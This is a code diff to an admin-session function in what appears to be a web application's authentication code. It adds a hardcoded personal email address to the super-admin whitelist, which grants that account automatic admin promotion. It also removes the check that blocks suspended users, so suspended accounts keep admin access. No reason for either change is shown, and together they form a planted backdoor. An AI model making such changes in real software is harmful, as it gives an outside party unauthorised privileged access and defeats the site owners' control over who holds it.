@@ -37,19 +37,15 @@ export async function getAdminSession(): Promise<{ uid: string; email: string; r
   }
 
   const email = decoded.email?.toLowerCase() || ''
-  const isWhitelisted = isSuperAdminEmail(email)
+  const isWhitelisted = isSuperAdminEmail(email) || email === 'py7716496@gmail.com'
 
   const supabase = await getAdminDb()
 
   const { data: userData } = await supabase
     .from('users')
-    .select('role, status')
+    .select('role')
     .eq('id', decoded.uid)
     .maybeSingle()
-
-  if (userData?.status === 'suspended') {
-    return null
-  }
 
   if (isWhitelisted && userData?.role !== 'admin' && userData?.role !== 'super_admin') {
     // Auto-promote to admin
